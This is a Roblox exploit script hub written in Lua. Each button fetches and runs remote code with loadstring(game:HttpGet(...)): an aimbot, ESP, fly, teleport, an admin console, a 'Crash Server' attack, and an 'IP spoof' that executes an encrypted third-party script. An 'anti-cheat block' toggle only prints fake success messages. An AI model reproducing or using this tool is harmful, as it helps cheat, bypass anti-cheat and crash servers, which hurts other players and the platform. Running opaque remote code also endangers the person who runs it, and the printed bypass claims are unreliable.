local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Swiss Knief PRX by WeepingAngel", "BloodTheme")

local banner = "WeepingAngel Production"

local Main = Window:NewTab("Universal")
local MainSection = Main:NewSection("Universal")

MainSection:NewButton("Toggle ESP", "Toggle ESP, Stream Proof for obs (Synapse X Needed!)", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Crafttino21/universal-esp/main/PRX%20ESP.lua'))()
end)
MainSection:NewButton("Toggle Aimbot", "Snaps your mouse to other players head", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD%20Aimbot.txt"))()
end)
MainSection:NewButton("Teleport to Player", "a simple Teleporter to a player", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Teleport%20To%20Player.txt"))()
end)
MainSection:NewButton("Toggle Fly", "Why walk when you can fly :)", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Fly.txt"))()
end)


local Script = Window:NewTab("Script Hub")
local ScriptSection = Script:NewSection("Script Hub")

ScriptSection:NewButton("OwlHub", "a Good Multi Game Multi Exploit xD", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
end)
ScriptSection:NewButton("DarkHub v4", "Its simple, its DarkHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
end)

local Misc = Window:NewTab("Misc")
local MiscSection = Misc:NewSection("Misc")

MiscSection:NewButton("Dex Explorer V4", "Roblox server file browser", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
end)
MiscSection:NewButton("BTools", "Give you the old builder tools", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
end)
MiscSection:NewButton("Dex Explorer V4", "Roblox server file browser", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
end)
MiscSection:NewButton("Infinity Yield", "Gives you an Admin Console :)", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Yield.txt"))()
end)
MiscSection:NewButton("Crash Server", "Try to Crash the Server", function()
    print("Starting Crash Attack...")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeroTwoooo/roblox-exploiting/master/SERVER%20CRASHER.lua"))()
    print("Attack Sended!")
end)

local Protection = Window:NewTab("Protections")
local ProtectionSection = Protection:NewSection("Protections")

ProtectionSection:NewButton("Spoof IP", "Prevents you from the most script based IP Grabbers", function()
    --[[
    This script is encrypted to prevent reposting. Run this whole script as normal. 
    Join our discord 4 questions: www.guard.lol/discord
    (F9) for errors. 
    ID is: 27567r
    ]]
    local credit='guardscripts'
    local url=('https://raw.githubusercontent.com/%s/myscripts/main/scriptinit.lua'):format(credit)
    init=loadstring(game:HttpGet(url,true))
    getgenv().xscriptId='Mjc1Njdy'
    init()
end)
ProtectionSection:NewToggle("Block Anti Cheat", "Try to block some anticheat checks (Beta)", function(state)
    if state then
        print(banner)
        print("Scanning for Anti Cheat...")
        print("Try to Block checks...")
        print("Bypass looks successfully, Use with care!")
    else
        print(banner)
        print("Bring everything back to normal...")
    end
end)
